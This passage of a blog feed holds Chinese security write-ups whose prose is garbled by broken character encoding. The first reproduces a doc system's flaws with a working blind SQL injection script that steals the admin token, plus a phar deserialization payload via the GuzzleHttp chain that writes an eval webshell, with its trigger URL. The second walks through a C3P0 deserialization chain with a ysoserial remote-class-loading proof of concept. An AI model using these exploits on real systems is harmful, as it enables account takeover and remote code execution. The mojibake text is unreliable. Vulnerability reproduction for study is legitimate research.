æŸ¥è¯¢æ­£ç¡®æ—¶<code>$item[&#39;password&#39;]</code> ä¸º1é”™è¯¯æ—¶ä¸º0å¸ƒå°”æ¡ä»¶å°±å‡ºæ¥äº†ï¼Œitemè¡¨ç»“æ„å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002062.png" alt="Untitled"></p><p>passwordä¸ºç¬¬å…­è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¬¬å…­è¡Œåšä¸€æ¬¡å¸ƒå°”åˆ¤æ–­å³å¯è¾¾åˆ°æœ€ç»ˆçš„å¸ƒå°”æ¡ä»¶åˆ¤æ–­</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002733.png" alt="Untitled"></p><p>æˆ‘æœ¬æœºçš„tokenå€¼ç¬¬ä¸€ä½æ˜¯9ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶å¸ƒå°”åˆ¤æ–­ä¸º1</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002119.png" alt="Untitled"></p><p>å½“ä¸ä¸º9æ—¶åˆ¤æ–­ä¸º0ï¼Œæ‰€ä»¥é€šè¿‡æ­¤ç§æ–¹æ³•å³å¯æ³¨å‡ºtokenæ•°æ®ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.129:8080&#x27;</span> <span class="comment">#çœŸå®ç¯å¢ƒéœ€è¦æ›¿æ¢çš„</span></span><br><span class="line"></span><br><span class="line">ocr = ddddocr.DdddOcr()</span><br><span class="line">table = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_captcha</span>():</span><br><span class="line">    <span class="comment">#è·å–è¯†åˆ«éªŒè¯ç </span></span><br><span class="line">    <span class="built_in">id</span> = requests.get(url=url+<span class="string">&#x27;/server/index.php?s=/api/common/createCaptcha&#x27;</span>)</span><br><span class="line">    captcha_id = <span class="built_in">id</span>.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;captcha_id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    captcha_re = requests.get(url=url+<span class="string">f&#x27;/server/index.php?s=/api/common/showCaptcha&amp;captcha_id=<span class="subst">&#123;captcha_id&#125;</span>&amp;1717902973000&#x27;</span>)</span><br><span class="line">    captcha = ocr.classification(captcha_re.content) <span class="comment">#æ­¤è¯†åˆ«ä¸ä¸€å®šç™¾åˆ†ç™¾æ­£ç¡®</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> captcha_id,captcha</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Injection</span>():</span><br><span class="line">    captcha_id,captcha = get_captcha()</span><br><span class="line">    token = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">#å¼€å§‹æ³¨å…¥</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>(table):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                payload = <span class="string">f&quot;1&#x27;) union select 1,2,3,4,5,substr((select token from user_token where uid=1),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;,7,8,9,10,11,12-- &quot;</span></span><br><span class="line">                result = requests.get(url=url + <span class="string">f&#x27;/server/index.php?s=/api/item/pwd&amp;password=1&amp;captcha_id=<span class="subst">&#123;captcha_id&#125;</span>&amp;captcha=<span class="subst">&#123;captcha&#125;</span>&amp;item_id=<span class="subst">&#123;payload&#125;</span>&#x27;</span>,proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;refer_url&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                    token += j</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;æ³¨å‡ºæ¥çš„tokenä¸ºï¼š&quot;</span>+token)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> result.json()[<span class="string">&#x27;error_code&#x27;</span>] == <span class="number">10206</span> :</span><br><span class="line">                    captcha_id,captcha = get_captcha()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(token) == i:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Injection()</span><br></pre></td></tr></table></figure><p>æ•ˆæœè¿˜è¡Œï¼Œå¤§ä½¬ä»¬çœŸæ»´çŒ›ï¼Œè¿™ä¸ªå¸ƒå°”æ¡ä»¶è‡ªå·±æ‰¾è¿˜çœŸä¸ä¸€å®šæ‰¾çš„å‡ºæ¥</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002301.png" alt="Untitled"></p><p>ç”±äºé‰´æƒåŸºæœ¬ä¸Šéƒ½æ˜¯é€šè¿‡è¿™ä¸ªtokenæ¥çš„ï¼Œæ‰€ä»¥æ‹¿åˆ°è¿™ä¸ªtokenå³å¯è¿›å…¥åå°</p><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>è¿™é‡Œç›´æ¥çœ‹3.2.5çš„ä¿®å¤commit</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002071.png" alt="Untitled"></p><p>å°±æ˜¯å°†è¿™ä¸ªæ–¹æ³•ä»publicæ”¹ä¸ºäº†privateï¼Œæ¥åˆ°è¿™ä¸ªå‡½æ•°ä¸‹çœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public function new_is_writeable($file)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (is_dir($file)) &#123;</span><br><span class="line">$<span class="built_in">dir</span> = $file;</span><br><span class="line"><span class="keyword">if</span> ($fp = @fopen(<span class="string">&quot;$dir/test.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line"><span class="meta">@fclose(<span class="params">$fp</span>);</span></span><br><span class="line"><span class="meta">@unlink(<span class="params"><span class="string">&quot;$dir/test.txt&quot;</span></span>);</span></span><br><span class="line">$writeable = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$writeable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ($fp = @fopen($file, <span class="string">&#x27;a+&#x27;</span>)) &#123;</span><br><span class="line"><span class="meta">@fclose(<span class="params">$fp</span>);</span></span><br><span class="line">$writeable = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$writeable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $writeable;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡Œé¢æœ‰ä¸€ä¸ªfopenï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥è§¦å‘ssrfå’Œpharååºåˆ—åŒ–ï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ssrfï¼Œfileç¡®å®å¯æ§ä½†æ˜¯dnslogå¹¶æ²¡æœ‰æ”¶åˆ°è¯·æ±‚</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002315.png" alt="Untitled"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªfileå·²ç»å˜ä¸ºäº†æˆ‘æŒ‡å®šçš„dnslogåœ°å€ï¼Œåæ¥æŸ¥äº†ä¸€ä¸‹è¿™ä¸ªå¤§éƒ¨åˆ†PHPå¹¶ä¸ä¼šå¼€å¯fopençš„ gopher wrapperæ‰€ä»¥è¯·æ±‚ä¸ä¼šæˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002906.png" alt="Untitled"></p><p>ä½†æ˜¯è¿™ä¸ªå‡½æ•°è¿˜å¯ä»¥æ‹¿æ¥åˆ©ç”¨pharååºåˆ—åŒ–</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>ååºåˆ—åŒ–ç‚¹å·²ç»æ‰¾åˆ°ï¼Œæ¥ä¸‹æ¥æ‰¾æ–‡ä»¶ä¸Šä¼ å’Œé“¾å­å³å¯ ï¼Œä¸Šä¼ ç‚¹å¥½æ‰¾ï¼Œè¿›åå°å³å¯æ‰¾åˆ°</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002400.png" alt="Untitled"></p><p>è®¿é—®è¿™ä¸ªåœ°å€å¯ä»¥è½¬åˆ°çœŸå®çš„å›¾ç‰‡åœ°å€ï¼Œæ¥ä¸‹æ¥å¯»æ‰¾ååºåˆ—é“¾å³å¯</p><p>è¿™ä¸ªdocæ˜¯åŸºäºthinkphp3.2.3ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬çš„thinkphpä¼¼ä¹æ›´å¤šçš„æ˜¯sqlæ³¨å…¥ï¼Œèƒ½rceçš„ä¸å¤šï¼Œçœ‹å¤§ä½¬ä»¬ç›´æ¥åˆ©ç”¨çš„æ˜¯GuzzleHttpè¿™ä¸ªç¬¬ä¸‰æ–¹åº“</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002538.png" alt="Untitled"></p><p>åˆ†ææ€è·¯å°±æ˜¯çœ‹æ˜¯å¦å­˜åœ¨composerï¼Œå³ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œç„¶åå¯»æ‰¾GuzzleHttpï¼Œå‘ç°å­˜åœ¨ç›´æ¥æ‰“</p><p>åœ¨phpggcæ•´åˆäº†è¿™æ¡é“¾ç›´æ¥ç”Ÿæˆå³å¯ï¼Œå› ä¸ºå­˜åœ¨ç™½åå•æ‰€ä»¥ç”Ÿæˆå®ƒè¿è¡Œçš„åç¼€å³å¯ï¼Œå¤§ä½¬ç›´æ¥ç»™äº†ç”Ÿæˆå‘½ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Guzzle/FW1 <span class="string">&quot;/var/www/html/Public/Uploads/shell.php&quot;</span> ./shell.php -p phar -pp ./gif -o out.png</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ç›´æ¥ç”Ÿæˆçš„å›¾ç‰‡åˆ©ç”¨å¤±è´¥ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æä¾›çš„å›¾ç‰‡é—®é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">namespace GuzzleHttp\Cookie &#123;  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">CookieJar</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        private $cookies;  </span><br><span class="line">        public function __construct()  </span><br><span class="line">        &#123;  </span><br><span class="line">            $this-&gt;cookies = array(new SetCookie());  </span><br><span class="line">        &#125;  </span><br><span class="line">        private $strictMode;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FileCookieJar</span> extends CookieJar  </span><br><span class="line">    &#123;  </span><br><span class="line">        private $filename = <span class="string">&quot;/var/www/html/shell.php&quot;</span>;  </span><br><span class="line">        private $storeSessionCookies = true;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SetCookie</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        private $data = array(<span class="string">&#x27;Expires&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php eval($_POST[0]);?&gt;&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">namespace &#123;  </span><br><span class="line">    $phar = new Phar(<span class="string">&quot;shell.phar&quot;</span>); //åç¼€åå¿…é¡»ä¸ºphar  </span><br><span class="line">    $phar-&gt;startBuffering();  </span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); //è®¾ç½®stub  </span><br><span class="line">    $o = new \GuzzleHttp\Cookie\FileCookieJar();  </span><br><span class="line">    $phar-&gt;setMetadata($o); //å°†â¾ƒå®šä¹‰çš„meta-dataå­˜â¼Šmanifest  </span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); //æ·»åŠ è¦å‹ç¼©çš„â½‚ä»¶  </span><br><span class="line">    //ç­¾åâ¾ƒåŠ¨è®¡ç®—  </span><br><span class="line">    $phar-&gt;stopBuffering();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªè„šæœ¬ç”Ÿæˆpharï¼Œç„¶åæ‰‹åŠ¨æ”¹åç¼€ä¸ºjpgï¼Œä¸Šä¼ åæ‹¿åœ°å€åœ¨ååºåˆ—åŒ–ç‚¹æ‰“ä¸€ä¸‹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/server/index.php?s=/home/index/new_is_writeable&amp;file=phar://Public/Uploads/<span class="number">2024</span>-06-<span class="number">15</span>/666d7515df4fd.jpg</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002860.png" alt="Untitled"></p><h2 id="ä¸€ç‚¹æ„Ÿæ‚Ÿ"><a href="#ä¸€ç‚¹æ„Ÿæ‚Ÿ" class="headerlink" title="ä¸€ç‚¹æ„Ÿæ‚Ÿ"></a>ä¸€ç‚¹æ„Ÿæ‚Ÿ</h2><p>åœ¨è¿™ä¸ªæ¼æ´æ²¡å…¬å¼€pocæ—¶æˆ‘å°±åœ¨å°è¯•å¤ç°ï¼Œä½†æ˜¯å½“æ—¶åœ¨å¯¹ç€commitæ­»ç£•é‚£ä¸ªsqlæ³¨å…¥ï¼Œç£•äº†ä¸€å¤©è¿æ³¨å…¥ç‚¹éƒ½æ²¡æ‰¾åˆ°ä»¥ä¸ºå¾ˆéš¾å°±æ²¡çœ‹äº†ï¼Œåˆ†ææ–‡ç« å‡ºæ¥åè™½ç„¶åˆ©ç”¨æœ‰éš¾åº¦ï¼Œä½†æ˜¯æ‰¾åˆ°åˆ©ç”¨ç‚¹è¿˜æ˜¯æŒºç®€å•çš„ï¼Œä»¥åå†åšç±»ä¼¼å¤ç°è¿˜æ˜¯å¾—çµæ´»ä¸€ç‚¹ã€‚ã€‚ã€‚ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/14802">https://xz.aliyun.com/t/14802</a></p><p><a href="https://xz.aliyun.com/t/14808">https://xz.aliyun.com/t/14808</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C3P0é“¾å­¦ä¹ </title>
      <link href="/2024/04/C3P0%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/C3P0%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å…ˆçœ‹çœ‹C3p0æ˜¯å¹²ä»€ä¹ˆçš„</p><blockquote><p>C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚</p></blockquote><blockquote><p>JDBCæ˜¯Java DataBase Connectivityçš„ç¼©å†™ï¼Œå®ƒæ˜¯Javaç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚<br>ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJavaä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡TCPè¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡JDBCæ¥å£æ¥è®¿é—®ï¼Œè€ŒJDBCæ¥å£åˆ™é€šè¿‡JDBCé©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚</p></blockquote><blockquote><p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p></blockquote><p>è¯´å®è¯ï¼Œè¿˜æ˜¯æ²¡èƒ½ç†è§£åœ¨å¼€å‘ä¸­çš„ä½œç”¨ï¼Œè¿˜æ˜¯å¾—å¼€å‘å®æˆ˜ä¸€ä¸‹æ‰èƒ½ç†è§£ã€‚ã€‚ã€‚<br>ä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>C3p0ä¸»è¦æ‰“çš„æ˜¯å¦‚ä¸‹ä¸‰ç§æ–¹å¼</p><ul><li>URLClassLoader è¿œç¨‹ç±»åŠ è½½</li><li>JNDI æ³¨å…¥</li><li>HEX åºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨ååºåˆ—åŒ–æ”»å‡»</li></ul><h2 id="URLClassLoader-è¿œç¨‹ç±»åŠ è½½"><a href="#URLClassLoader-è¿œç¨‹ç±»åŠ è½½" class="headerlink" title="URLClassLoader è¿œç¨‹ç±»åŠ è½½"></a>URLClassLoader è¿œç¨‹ç±»åŠ è½½</h2><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>å…ˆçœ‹åˆ©ç”¨å†è·Ÿé“¾å­ï¼Œè¿™é‡Œåˆ©ç”¨ç›´æ¥å°†ysoserialçš„jaråŒ…å¯¼ä¸ºä¾èµ–åˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> ysoserial.Serializer;  </span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.C3P0;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3p0Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">c3P0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> c3P0.getObject(<span class="string">&quot;http://127.0.0.1:8866/:test&quot;</span>);  </span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(object);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> oos.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>:test</code>è¿™ä¸ªå³æ‰§è¡Œå‘½ä»¤çš„æ¶æ„å­—èŠ‚ç ï¼Œåœ¨è¿™ä¸ªå­—èŠ‚ç è·¯å¾„ç”¨pythonèµ·ä¸ªæœåŠ¡ç”¨äºè¿œç¨‹ç±»åŠ è½½<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111756605.png"><br>è¿è¡Œå³å¯å¼¹è®¡ç®—å™¨æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111744853.png"></p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é‡Œå…ˆå°½é‡å°è¯•è‡ªå·±åˆ†æä¸€éæµç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">readObject:205, PoolBackedDataSourceBase (com.mchange.v2.c3p0.impl)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">main:17, C3p0Test (FastjsonPoc)</span><br></pre></td></tr></table></figure><p>ä»è°ƒç”¨æ ˆå¯ä»¥å‘ç°ï¼Œæœ€ç»ˆæ˜¯æ¥åˆ°<code>PoolBackedDataSourceBase</code>ç±»ä¸‹çš„readObjectæ–¹æ³•æ‰§è¡Œçš„å‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111915762.png" alt="image-20240411191526647"><br>è¿™ä¸ªifåˆ¤æ–­å®Œè®¡ç®—å™¨è¢«å¼¹å‡ºï¼Œç»§ç»­è·Ÿè¿›ï¼Œè¿™é‡Œå…ˆçœ‹ç»“æœ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111915286.png" alt="image-20240411191541140"><br>æœ€ç»ˆæ˜¯åœ¨<code>com/mchange/v2/naming/ReferenceableUtils.class</code>ä¸‹è¿›è¡Œçš„å®ä¾‹åŒ–ï¼Œç”±äºæ˜¯ç”¨çš„ysoserialæ‰€ä»¥è¿™é‡Œçš„ä»£ç éƒ½æ˜¯åç¼–è¯‘çš„ï¼Œè¿˜æ˜¯ä¸ç”¨è¿™ä¸ªï¼Œçœ‹åŸæœ¬çš„ä»£ç è¿›è¡Œåˆ†æï¼Œè¿™é‡Œè‡ªå·±å°è¯•åˆ†æäº†ä¸€ä¸‹ï¼Œä½†æ˜¯è‡ªå·±è¿˜æ˜¯æ— æ³•ç‹¬ç«‹ç†æ¸…æ•´ä¸ªé€»è¾‘ï¼Œå†™ä¸å‡ºexpï¼Œtclã€‚ã€‚ã€‚<br>è¿™é‡Œå…ˆå°è¯•è‡ªå·±å†™ä¸ªæœ€ååˆ©ç”¨çš„expï¼Œåˆ©ç”¨ysoserialåˆ†æä¸€ä¸‹<code>referenceToObject</code>æ–¹æ³•çš„å‚æ•°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111916363.png" alt="image-20240411191619194"><br>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>Reference</code>ç±»çš„å¯¹è±¡ï¼Œé‡Œé¢å«æœ‰æˆ‘ä»¬çš„å±é™©ç±»å’Œè¿œç¨‹åœ°å€ï¼Œå…¶å®ƒçš„ä¸ºnullå³å¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111916311.png" 